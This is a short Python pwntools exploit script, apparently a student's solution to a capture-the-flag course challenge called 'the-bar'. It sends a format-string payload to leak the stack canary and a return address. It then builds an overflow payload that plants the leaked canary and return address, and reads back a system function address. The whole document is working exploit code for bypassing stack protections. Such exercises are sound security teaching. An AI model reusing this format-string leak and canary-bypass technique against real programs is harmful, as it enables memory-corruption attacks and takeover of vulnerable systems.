# the-barex.py - Aidan Wech (Onyxymous)

from pwn import *
import sys

# debug info
bin64 = './the-bar'

# remote variables
host = 'cs4401shell2.walls.ninja'
port = 14161

# exploit variables
buffarg = 6
canaryarg = 9
unlockretarg = 11
mainretarg = 16
canaryoffset = 8 * (canaryarg - buffarg)
unlockretoffset = 8 * (unlockretarg - buffarg)
mainretoffset = 8 * (mainretarg - buffarg)
argleak = b'%' + bytes(str(canaryarg), 'utf-8') + b'$p %' + bytes(str(unlockretarg), 'utf-8') + b'$p'

# process
# first, leak the canary from the stack
# 0x5555554008fa (unlockretarg) - 0x55555540083a (unlockstart) = 192
with context.silent:
	p = process(bin64)
	p.recvline(timeout=1)
	p.recvline(timeout=1)
	p.recvline(timeout=1)
	p.recvline(timeout=1)
	p.sendline(argleak)
	sys.stdout.buffer.write(argleak)
	sys.stdout.buffer.write(b'\n')
	
	# craft exploit string with canary value in it
	leakedvals = p.recvline(timeout=1).strip().decode('utf-8')
	canary = int(leakedvals.split()[0], 16)
	unlockret = int(leakedvals.split()[1], 16)
	unlockstart = unlockret - 69
	
	log.info(f'Canary String: {hex(canary)}')
	log.info(f'Unlock Return Address: {hex(unlockret)}')
	
	exploit = flat({
	canaryoffset: p64(canary),
	unlockretoffset: p64(unlockret)})
	p.sendline(exploit)
	sys.stdout.buffer.write(exploit)
	sys.stdout.buffer.write(b'\n')
	system = int(p.recvline(timeout=1).strip(), 16)
	
	log.info(f'System Address: {hex(system)}')
